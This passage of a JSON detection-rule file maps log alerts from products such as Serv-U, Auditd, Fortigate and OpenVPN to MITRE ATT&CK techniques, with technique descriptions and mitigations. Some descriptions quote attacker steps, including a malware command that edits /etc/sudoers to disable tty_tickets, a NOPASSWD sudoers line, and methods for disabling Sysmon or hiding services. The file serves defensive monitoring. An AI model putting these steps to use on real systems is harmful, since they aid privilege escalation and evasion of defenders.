            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80513,
        "rule_description": "Serv-U: File deleted",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 80516,
        "rule_description": "Serv-U: Directory deleted",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 80522,
        "rule_description": "Serv-U: FTP/FTPS Permission denied",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80523,
        "rule_description": "Serv-U: SFTP (SSH) Permission denied",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80524,
        "rule_description": "Serv-U: HTTP/HTTPS Permission denied",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80712,
        "rule_description": "Auditd: Execution of a file ended abnormally.",
        "mitre_id": [
            "T1204"
        ],
        "possible_attacks": [
            "User Execution"
        ],
        "description": [
            "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](\n\nWhile [User Execution]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](\n\nAdversaries may also deceive users into performing actions such as:\n\n* Enabling [Remote Access Software]( allowing direct control of the system to the adversary\n* Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](\n* Downloading and executing malware for [User Execution](\n* Coerceing users to copy, paste, and execute malicious code manually\n\nFor example, tech support scams can be facilitated through [Phishing]( vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software]("
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."
        ]
    },
    {
        "rule_id": 80714,
        "rule_description": "Auditd: File or a directory access ended abnormally.",
        "mitre_id": [
            "T1203",
            "T1565.001"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution",
            "Stored Data Manipulation"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
            "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks.",
            "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."
        ]
    },
    {
        "rule_id": 80718,
        "rule_description": "Auditd: User-space account addition ended abnormally.",
        "mitre_id": [
            "T1136"
        ],
        "possible_attacks": [
            "Create Account"
        ],
        "description": [
            "Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
        ],
        "mitigation_strategies": [
            "Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."
        ]
    },
    {
        "rule_id": 80719,
        "rule_description": "Auditd: User-space account deletion ended abnormally.",
        "mitre_id": [
            "T1531"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 80721,
        "rule_description": "Auditd: User becomes root.",
        "mitre_id": [
            "T1548.003"
        ],
        "possible_attacks": [
            "Sudo and Sudo Caching"
        ],
        "description": [
            "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>. Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>. In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default."
        ],
        "mitigation_strategies": [
            "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."
        ]
    },
    {
        "rule_id": 80723,
        "rule_description": "Auditd: Limit of failed login attempts reached.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 80740,
        "rule_description": "Auditd: Replay attack detected.",
        "mitre_id": [
            "T1212"
        ],
        "possible_attacks": [
            "Exploitation for Credential Access"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers."
        ]
    },
    {
        "rule_id": 80791,
        "rule_description": "Audit: Deleted: $(audit.file.name).",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 81607,
        "rule_description": "Fortigate: Multiple failed login events from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 81609,
        "rule_description": "Fortigate: Multiple changed configuration events from same source.",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 81611,
        "rule_description": "Fortigate: Multiple default tunneling setting events from same source.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 81615,
        "rule_description": "Fortigate: Multiple firewall SSL VPN failed login events from same source.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 44731,
        "rule_description": "FortiAuth: Authentication event.",
        "mitre_id": [
            "T1102"
        ],
        "possible_attacks": [
            "Web Service"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 44733,
        "rule_description": "FortiAuth: Authentication failed by user $(dstuser).",
        "mitre_id": [
            "T1102"
        ],
        "possible_attacks": [
            "Web Service"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 81710,
        "rule_description": "HP 5500 EI: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 81803,
        "rule_description": "OpenVPN: Connection Certificate Failed",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 81804,
        "rule_description": "OpenVPN: Certificate failed - Possible revoked user",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 81904,
        "rule_description": "RSA Authentication Manager: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 82405,
        "rule_description": "Cisco eStreamer: APP-DETECT DNS request for potential malware",
        "mitre_id": [
            "T1071.004"
        ],
        "possible_attacks": [
            "DNS"
        ],
        "description": [
            "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. "
        ]
    },
    {
        "rule_id": 83200,
        "rule_description": "MS Logs: The audit log was cleared.",
        "mitre_id": [
            "T1070"
        ],
        "possible_attacks": [
            "Indicator Removal"
        ],
        "description": [
            "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
        ],
        "mitigation_strategies": [
            "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."
        ]
    },
    {
        "rule_id": 83201,
        "rule_description": "MS Logs: A Windows log file was cleared.",
        "mitre_id": [
            "T1070"
        ],
        "possible_attacks": [
            "Indicator Removal"
        ],
        "description": [
            "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
        ],
        "mitigation_strategies": [
            "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."
        ]
    },
    {
        "rule_id": 83202,
        "rule_description": "The Event log service was started",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 85006,
        "rule_description": "SQL Server: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 85502,
        "rule_description": "Identity Guard: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 85760,
        "rule_description": "MongoDB: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
